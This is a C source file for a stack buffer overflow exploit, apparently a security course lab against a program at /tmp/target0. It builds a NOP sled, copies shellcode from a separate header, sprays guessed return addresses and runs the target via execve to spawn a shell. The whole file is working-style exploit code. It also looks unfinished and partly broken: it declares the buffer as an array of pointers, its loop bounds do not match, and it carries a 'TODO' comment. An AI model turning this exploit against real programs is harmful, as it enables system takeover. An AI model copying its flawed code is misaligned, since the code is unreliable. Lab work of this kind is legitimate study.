#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"

unsigned long get_sp(void) {
  __asm__("movl %esp, %eax");
}

int main(void)
{
  char *args[3]; 
  char *buffer[438]; // Make larger size as target program?
  char *env[1];
  
  // Initialize buffer with NOP instructions
  memset(&buffer, 0x90, sizeof(buffer));

  // Place shell code at endish of buffer
  int n;
  int j = 0;
  for (n=203; n < (201 + sizeof(shellcode)); n++, j++) {
    // printf("shell code: 0x%x\n", shellcode[j]);
    *(long *) &buffer[n] = shellcode[j];
  }

  // Get SP value
  unsigned long sp = get_sp();
  unsigned long target = sp - 768;
  printf("Stack pointer: 0x%x\n", sp);
  printf("Stack pointer target (sp - 0x300): 0x%x\n", target);

  // Add a bunch of target SP values to buffer
  for (int i = 400; i < 438; i+=4) {
    *(long *) &buffer[i] = target;
  }

  // Print out contents of buffer for testing
  for (int i = 0; i < 438; i++) {
    printf("buffer[%d] = 0x%x\n", i, buffer[i]);
  }

  args[0] = TARGET;
  args[1] = buffer; // TODO: Replace with shell code
  args[2] = NULL; // argv and envp arrays must each include a null pointer at end of array

  printf("args stack target: 0x%x\n", args[1]);
  
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
